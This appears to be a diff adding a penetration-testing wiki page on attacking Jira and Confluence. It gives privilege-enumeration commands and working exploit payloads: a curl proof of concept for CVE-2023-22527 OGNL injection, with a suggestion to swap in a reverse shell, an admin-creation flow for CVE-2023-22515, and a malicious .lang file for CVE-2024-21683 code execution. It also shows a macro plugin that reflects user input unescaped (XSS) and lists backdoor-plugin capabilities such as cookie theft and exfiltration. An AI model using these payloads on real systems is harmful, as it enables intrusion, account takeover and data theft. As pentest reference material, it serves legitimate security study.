@@ -1,0 +1,165 @@
+# Jira & Confluence
+
+## Check Privileges
+
+In Jira, **privileges can be checked** by any user, authenticated or not, through the endpoints `/rest/api/2/mypermissions` or `/rest/api/3/mypermissions`. These endpoints reveal the user's current privileges. A notable concern arises when **non-authenticated users hold privileges**, indicating a **security vulnerability** that could potentially be eligible for a **bounty**. Similarly, **unexpected privileges for authenticated users** also highlight a **vulnerability**.
+
+An important **update** was made on **1st February 2019**, requiring the 'mypermissions' endpoint to include a **'permission' parameter**. This requirement aims to **enhance security** by specifying the privileges being queried: [check it here](https://developer.atlassian.com/cloud/jira/platform/change-notice-get-my-permissions-requires-permissions-query-parameter/#change-notice---get-my-permissions-resource-will-require-a-permissions-query-parameter)
+
+- ADD_COMMENTS
+- ADMINISTER
+- ADMINISTER_PROJECTS
+- ASSIGNABLE_USER
+- ASSIGN_ISSUES
+- BROWSE_PROJECTS
+- BULK_CHANGE
+- CLOSE_ISSUES
+- CREATE_ATTACHMENTS
+- CREATE_ISSUES
+- CREATE_PROJECT
+- CREATE_SHARED_OBJECTS
+- DELETE_ALL_ATTACHMENTS
+- DELETE_ALL_COMMENTS
+- DELETE_ALL_WORKLOGS
+- DELETE_ISSUES
+- DELETE_OWN_ATTACHMENTS
+- DELETE_OWN_COMMENTS
+- DELETE_OWN_WORKLOGS
+- EDIT_ALL_COMMENTS
+- EDIT_ALL_WORKLOGS
+- EDIT_ISSUES
+- EDIT_OWN_COMMENTS
+- EDIT_OWN_WORKLOGS
+- LINK_ISSUES
+- MANAGE_GROUP_FILTER_SUBSCRIPTIONS
+- MANAGE_SPRINTS_PERMISSION
+- MANAGE_WATCHERS
+- MODIFY_REPORTER
+- MOVE_ISSUES
+- RESOLVE_ISSUES
+- SCHEDULE_ISSUES
+- SET_ISSUE_SECURITY
+- SYSTEM_ADMIN
+- TRANSITION_ISSUES
+- USER_PICKER
+- VIEW_AGGREGATED_DATA
+- VIEW_DEV_TOOLS
+- VIEW_READONLY_WORKFLOW
+- VIEW_VOTERS_AND_WATCHERS
+- WORK_ON_ISSUES
+
+Example: `https://your-domain.atlassian.net/rest/api/2/mypermissions?permissions=BROWSE_PROJECTS,CREATE_ISSUES,ADMINISTER_PROJECTS`
+
+```bash
+#Check non-authenticated privileges
+curl https://jira.some.example.com/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
+```
+
+## Automated enumeration
+
+- [https://github.com/0x48piraj/Jiraffe](https://github.com/0x48piraj/Jiraffe)
+- [https://github.com/bcoles/jira_scan](https://github.com/bcoles/jira_scan)
+
+## Recent RCEs & practical exploit notes (Confluence)
+
+### CVE-2023-22527 – unauthenticated template/OGNL injection (10.0)
+
+* Affects Confluence Data Center/Server 8.0.x–8.5.3 & 8.4.5. Vulnerable Velocity template `text-inline.vm` allows OGNL evaluation without authentication.
+* Quick PoC (command runs as confluence user):
+
+```bash
+curl -k -X POST "https://confluence.target.com/template/aui/text-inline.vm" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'label=aaa%27%2b#request.get("KEY_velocity.struts2.context").internalGet("ognl").findValue(#parameters.poc[0],{})%2b%27&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("x-cmd",(new+freemarker.template.utility.Execute()).exec({"id"}))'
+```
+
+* Response header `x-cmd` will contain the command output. Swap `id` for a reverse shell payload.
+* Scanner: nuclei template `http/cves/2023/CVE-2023-22527.yaml` (ships in nuclei-templates ≥9.7.5).
+
+### CVE-2023-22515 – setup reactivation admin creation (auth bypass)
+
+* Publicly reachable Confluence Data Center/Server 8.0.0–8.5.1 allows flipping `setupComplete` and re‑running `/setup/setupadministrator.action` to create a new admin account.
+* Minimal exploit flow:
+  1. `GET /server-info.action` (unauthenticated) to ensure reachability.
+  2. `POST /server-info.action` with `buildNumber` parameters to toggle setup flag.
+  3. `POST /setup/setupadministrator.action` with `fullName`, `email`, `username`, `password`, `confirm` to spawn an admin.
+
+### CVE-2024-21683 – authenticated RCE via Code Macro upload
+
+* Confluence Admin can upload crafted language definition in **Configure Code Macro**; Rhino engine executes embedded Java, leading to RCE.
+* For a shell, upload a `.lang` file containing payload like:
+
+```xml
+<?xml version="1.0"?>
+<languages>
+  <language key="pwn" name="pwn" namespace="java.lang">
+    <tokens>
+      <token scope="normal">${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}</token>
+    </tokens>
+  </language>
+</languages>
+```
+
+* Trigger by selecting the malicious language in any Code Macro body. Metasploit module `exploit/multi/http/atlassian_confluence_rce_cve_2024_21683` automates auth + upload + exec.
+
+## Atlasian Plugins
+
+As indicated in this [**blog**](https://cyllective.com/blog/posts/atlassian-audit-plugins), in the documentation about [Plugin modules ↗](https://developer.atlassian.com/server/framework/atlassian-sdk/plugin-modules/) it's possible to check the different types of plugins, like:
+
+- [REST Plugin Module ↗](https://developer.atlassian.com/server/framework/atlassian-sdk/rest-plugin-module): Expose RESTful API endpoints
+- [Servlet Plugin Module ↗](https://developer.atlassian.com/server/framework/atlassian-sdk/servlet-plugin-module/): Deploy Java servlets as part of a plugin
+- [Macro Plugin Module ↗](https://developer.atlassian.com/server/confluence/macro-module/): Implement Confluence Macros, i.e. parameterised HTML templates
+
+This is an example of the macro plugin type:
+
+<details>
+<summary>Macro plugin example</summary>
+
+```java
+package com.atlassian.tutorial.macro;
+
+import com.atlassian.confluence.content.render.xhtml.ConversionContext;
+import com.atlassian.confluence.macro.Macro;
+import com.atlassian.confluence.macro.MacroExecutionException;
+
+import java.util.Map;
+
+public class helloworld implements Macro {
+
+    public String execute(Map<String, String> map, String body, ConversionContext conversionContext) throws MacroExecutionException {
+        if (map.get("Name") != null) {
+            return ("<h1>Hello " + map.get("Name") + "!</h1>");
+        } else {
+            return "<h1>Hello World!<h1>";
+        }
+    }
+
+    public BodyType getBodyType() { return BodyType.NONE; }
+
+    public OutputType getOutputType() { return OutputType.BLOCK; }
+}
+```
+
+</details>
+
+It's possible to observe that these plugins might be vulnerable to common web vulnerabilities like XSS. For example the previous example is vulnerable because it's reflecting data given by the user.
+
+Once a XSS is found, in [**this github repo**](https://github.com/cyllective/XSS-Payloads/tree/main/Confluence) you can find some payloads to increase the impact of the XSS.
+
+## Backdoor Plugin
+
+[**This post**](https://cyllective.com/blog/posts/atlassian-malicious-plugin) describes different (malicious) actions that could perform a malicious Jira plugin. You can find [**code example in this repo**](https://github.com/cyllective/malfluence).
+
+These are some of the actions a malicious plugin could perform:
+
+- **Hiding Plugins from Admins**: It's possible to hide the malicious plugin injecting some front-end javascript
+- **Exfiltrating Attachments and Pages**: Allow to access and exfiltrate all the data.
+- **Stealing Session Tokens**: Add an endpoint that will echo the headers in the response (with the cookie) and some javascript that will contact it and leak the cookies.
+- **Command Execution**: Ofc it's possible to create a plugin that will execute code.
+- **Reverse Shell**: Or get a reverse shell.
+- **DOM Proxying**: If the confluence is inside a private network, it would be possible to establish a connection through the browser of some user with access to it and for example contact the server command executing through it.
+
+## References
+
+- [Atlassian advisory – CVE-2023-22527 template injection RCE](https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-datacenter-and-confluence-server-1333990257.html)
+- [CISA AA23-289A – Active exploitation of Confluence CVE-2023-22515](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-289a)
